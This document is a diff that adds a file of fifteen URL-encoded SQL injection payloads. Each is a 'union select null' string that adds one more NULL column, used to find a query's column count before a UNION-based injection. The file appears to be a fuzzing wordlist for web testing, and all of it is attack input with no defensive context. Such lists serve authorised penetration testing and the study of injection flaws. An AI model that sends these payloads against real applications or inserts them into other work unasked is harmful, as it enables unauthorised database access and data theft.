@@ -1,0 +1,15 @@
+'union%20select%20null--
+'union%20select%20null%2cnull--
+'union%20select%20null%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
+'union%20select%20null%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull%2cnull--
